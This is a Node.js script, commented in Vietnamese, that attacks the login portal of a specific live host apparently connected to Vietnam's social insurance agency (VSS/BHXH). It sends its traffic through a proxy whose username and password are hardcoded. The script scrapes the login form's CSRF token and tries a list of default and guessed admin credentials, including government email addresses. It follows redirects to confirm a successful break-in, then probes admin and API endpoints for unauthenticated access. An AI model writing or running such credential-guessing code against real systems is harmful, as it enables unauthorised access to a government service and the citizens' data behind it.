const axios = require('axios');
const { HttpProxyAgent } = require('http-proxy-agent');
const cheerio = require('cheerio');

// Proxy configuration 
const proxyUrl = 'http://beba111:tDV5tkMchYUBMD@ip.mproxy.vn:12301';
const baseUrl = 'http://vssapp.teca.vn:8088';

console.log('🔐 PHÂN TÍCH VÀ THỬ ĐĂNG NHẬP VSS PORTAL');
console.log('=' * 60);

// Tạo client với proxy
function createClient() {
  return axios.create({
    httpAgent: new HttpProxyAgent(proxyUrl),
    timeout: 15000,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
      'Accept-Encoding': 'gzip, deflate',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1'
    }
  });
}

// Phân tích trang login
async function analyzeLoginPage() {
  console.log('🔍 1. PHÂN TÍCH TRANG LOGIN');
  console.log('─'.repeat(50));
  
  const client = createClient();
  
  try {
    const response = await client.get(`${baseUrl}/login`);
    const html = response.data;
    
    console.log('✅ Đã lấy được trang login');
    console.log(`📏 Kích thước: ${html.length} characters`);
    
    // Parse HTML với cheerio
    const $ = cheerio.load(html);
    
    // Tìm form login
    const forms = $('form');
    console.log(`📝 Số form tìm thấy: ${forms.length}`);
    
    forms.each((i, form) => {
      const $form = $(form);
      const action = $form.attr('action') || 'không có action';
      const method = $form.attr('method') || 'GET';
      
      console.log(`\n📋 Form ${i + 1}:`);
      console.log(`   Action: ${action}`);
      console.log(`   Method: ${method}`);
      
      // Tìm tất cả input fields
      const inputs = $form.find('input');
      console.log(`   Số input fields: ${inputs.length}`);
      
      inputs.each((j, input) => {
        const $input = $(input);
        const name = $input.attr('name') || 'no-name';
        const type = $input.attr('type') || 'text';
        const value = $input.attr('value') || '';
        const placeholder = $input.attr('placeholder') || '';
        
        console.log(`     ${j + 1}. ${name} (${type}) - "${placeholder}" = "${value}"`);
      });
    });
    
    // Tìm CSRF token
    const csrfToken = $('input[name="_token"]').attr('value') || 
                      $('meta[name="csrf-token"]').attr('content') ||
                      null;
    
    if (csrfToken) {
      console.log(`\n🔑 CSRF Token tìm thấy: ${csrfToken.substring(0, 20)}...`);
    } else {
      console.log('\n❌ Không tìm thấy CSRF token');
    }
    
    // Tìm thông tin khác
    const title = $('title').text();
    const headings = $('h1, h2, h3').map((i, el) => $(el).text()).get();
    const labels = $('label').map((i, el) => $(el).text()).get();
    
    console.log(`\n📄 Title: ${title}`);
    if (headings.length > 0) {
      console.log(`📋 Headings: ${headings.join(', ')}`);
    }
    if (labels.length > 0) {
      console.log(`🏷️ Labels: ${labels.join(', ')}`);
    }
    
    // Lưu cookies
    const cookies = response.headers['set-cookie'];
    let cookieHeader = '';
    if (cookies) {
      cookieHeader = cookies.map(c => c.split(';')[0]).join('; ');
      client.defaults.headers.Cookie = cookieHeader;
      console.log('✅ Đã lưu session cookies');
    }
    
    return { client, csrfToken, cookieHeader, html, $ };
    
  } catch (error) {
    console.log(`❌ Lỗi: ${error.message}`);
    return null;
  }
}

// Thử đăng nhập với các credentials khác nhau
async function attemptLogin(client, csrfToken) {
  console.log('\n🔐 2. THỬ ĐĂNG NHẬP');
  console.log('─'.repeat(50));
  
  const credentials = [
    // Credentials từ VSS/BHXH
    { email: 'admin@vss.gov.vn', password: 'admin123' },
    { email: 'admin@baohiemxahoi.gov.vn', password: 'admin' },
    { email: 'user@vss.gov.vn', password: 'password' },
    
    // Common admin credentials
    { email: 'admin@admin.com', password: 'admin' },
    { email: 'admin', password: 'admin123' },
    { email: 'administrator', password: 'password' },
    
    // Thử với thông tin thực của user (nếu có)
    { email: 'test@test.com', password: 'test123' }
  ];
  
  for (let i = 0; i < credentials.length; i++) {
    const cred = credentials[i];
    console.log(`\n📧 Thử ${i + 1}: ${cred.email} / ${cred.password}`);
    
    try {
      // Chuẩn bị data cho POST request
      const postData = {
        email: cred.email,
        password: cred.password,
        _token: csrfToken
      };
      
      const response = await client.post(`${baseUrl}/login`, postData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Referer': `${baseUrl}/login`,
          'Origin': baseUrl
        },
        maxRedirects: 0, // Không tự động follow redirect
        validateStatus: status => status < 500 // Accept redirects
      });
      
      console.log(`   📊 Status: ${response.status}`);
      
      if (response.status === 302 || response.status === 301) {
        const location = response.headers.location;
        console.log(`   🚀 Redirect to: ${location}`);
        
        if (location && !location.includes('login')) {
          console.log('   🎉 CÓ THỂ ĐĂNG NHẬP THÀNH CÔNG!');
          
          // Thử follow redirect để xem dashboard
          try {
            const dashboardResponse = await client.get(location.startsWith('http') ? location : baseUrl + location);
            console.log(`   📄 Dashboard response: ${dashboardResponse.status} (${dashboardResponse.data.length} chars)`);
            
            // Check nếu có thông tin user trong response
            if (dashboardResponse.data.includes('dashboard') || 
                dashboardResponse.data.includes('profile') ||
                dashboardResponse.data.includes('logout')) {
              console.log('   ✅ XÁC NHẬN ĐĂNG NHẬP THÀNH CÔNG!');
              return { success: true, credentials: cred, dashboardHtml: dashboardResponse.data };
            }
          } catch (err) {
            console.log(`   ⚠️ Không thể truy cập dashboard: ${err.message}`);
          }
        }
      } else if (response.status === 200) {
        // Check nếu có thông báo lỗi trong response
        if (response.data.includes('error') || response.data.includes('invalid') || 
            response.data.includes('wrong') || response.data.includes('sai')) {
          console.log('   ❌ Đăng nhập thất bại (có thông báo lỗi)');
        } else {
          console.log('   ⚠️ Response 200 - cần kiểm tra thêm');
        }
      }
      
    } catch (error) {
      if (error.response?.status === 302) {
        const location = error.response.headers.location;
        console.log(`   🚀 Redirect to: ${location}`);
        
        if (location && !location.includes('login')) {
          console.log('   🎉 CÓ THỂ ĐĂNG NHẬP THÀNH CÔNG!');
        }
      } else {
        console.log(`   ❌ Lỗi: ${error.message}`);
      }
    }
    
    // Delay để tránh rate limiting
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  return { success: false };
}

// Thử truy cập các trang yêu cầu authentication
async function testProtectedPages(client) {
  console.log('\n🔒 3. TEST PROTECTED PAGES');
  console.log('─'.repeat(50));
  
  const protectedPages = [
    '/dashboard',
    '/home', 
    '/admin',
    '/profile',
    '/user',
    '/settings',
    '/api/user/profile',
    '/api/me'
  ];
  
  for (let page of protectedPages) {
    try {
      console.log(`   Testing: ${page}`);
      const response = await client.get(baseUrl + page);
      
      if (response.status === 200) {
        console.log(`   ✅ ${page} - Accessible (${response.data.length} chars)`);
        
        // Check if this looks like a dashboard/protected content
        if (response.data.includes('dashboard') || 
            response.data.includes('welcome') ||
            response.data.includes('profile') ||
            response.data.includes('logout')) {
          console.log(`      🎯 Có thể là trang protected thật sự!`);
        }
      } else {
        console.log(`   ⚠️ ${page} - Status: ${response.status}`);
      }
      
    } catch (error) {
      const status = error.response?.status || 'ERROR';
      if (status === 302 || status === 301) {
        const location = error.response.headers.location;
        console.log(`   🔀 ${page} - Redirect to: ${location}`);
        
        if (location && location.includes('login')) {
          console.log(`      🔐 Yêu cầu authentication`);
        }
      } else if (status !== 404) {
        console.log(`   ❌ ${page} - ${status}`);
      }
    }
    
    await new Promise(resolve => setTimeout(resolve, 300));
  }
}

// Main function
async function main() {
  try {
    // Step 1: Phân tích trang login
    const result = await analyzeLoginPage();
    if (!result) {
      console.log('❌ Không thể phân tích trang login');
      return;
    }
    
    const { client, csrfToken } = result;
    
    // Step 2: Thử đăng nhập
    if (csrfToken) {
      const loginResult = await attemptLogin(client, csrfToken);
      if (loginResult.success) {
        console.log('\n🎉 ĐĂNG NHẬP THÀNH CÔNG!');
        console.log(`✅ Credentials: ${loginResult.credentials.email} / ${loginResult.credentials.password}`);
        
        // Save dashboard content for analysis
        if (loginResult.dashboardHtml) {
          console.log('💾 Đang lưu nội dung dashboard...');
          // Có thể save vào file nếu cần
        }
      }
    } else {
      console.log('\n⚠️ Không có CSRF token, bỏ qua bước đăng nhập');
    }
    
    // Step 3: Test protected pages
    await testProtectedPages(client);
    
    console.log('\n📊 HOÀN THÀNH PHÂN TÍCH ĐĂNG NHẬP!');
    
  } catch (error) {
    console.error('💥 Lỗi:', error.message);
  }
}

main();